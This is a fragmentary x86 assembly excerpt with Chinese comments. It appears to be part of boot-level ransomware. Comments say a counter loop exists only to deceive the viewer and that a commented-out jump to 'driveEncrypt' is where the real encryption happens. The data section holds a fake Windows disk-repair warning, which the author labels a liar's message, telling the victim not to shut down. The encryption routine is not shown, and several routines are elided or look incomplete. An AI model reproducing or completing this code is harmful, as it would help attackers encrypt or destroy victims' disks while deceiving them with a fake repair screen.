...
next:
    ...
    mov edx, 0
    mov eax, [NUMBERS]
    cmp eax,114514000       ;只执行到114514000w ，用于欺骗眼睛
    jl next                     ;继续循环直到达到限制
  ;  jmp driveEncrypt ; 跳转到'driveEncrypt'函数地址 此时才进行真正的加密
    mov si,warn    
    mov bh,0x0c       ; 设置文本颜色为红字黑底
	mov ah, 0x02        ; 设置光标位置
	mov bh, 0x00        ; 页面号为0
	mov dh, 5           ; 行为5，即第六行
	mov dl, 0           ; 列为0
	int 0x10            ; 调用10h中断，将光标位置移动到第六行开头
	 call print_str
     jmp $
;=====================================================================================================================
...
ClearScreen:
    ...
    ret
copy_string:
    lodsb                  ; 从SI处读取一个字节到AL，并将SI递增
    stosb                  ; 将AL的内容存储到DI处，并将DI递增
    test al, al            ; 检查AL中的字节是否为0，即字符串结束符
    jnz copy_string        ; 如果AL不为0，则继续复制字符串
write_char:
    mov ah,0eh
    mov si,0ffffh  
    inc si
...
data:
    ...
    msg2 db ' of 3000000000 %) It takes about 3 minutes', 0  ;消息1
	warn db 'Warning: Windows has detected a disk error and is trying to repair your PC, please do not shut down your computer or you will lose all your data!', 0 ;大大大大大骗子信息
    BOOT_DRIVE dd 0             ;引导驱动器
    CURSOR_LINE dd 0           ;光标位置行
    CUSROR_COL dd 0            ;光标位置列
    NUMBERS dd 0               ;数字
    strbuf db 0                ;字符串缓冲区
	warnbuf db 0               ;解决bug的无奈之举
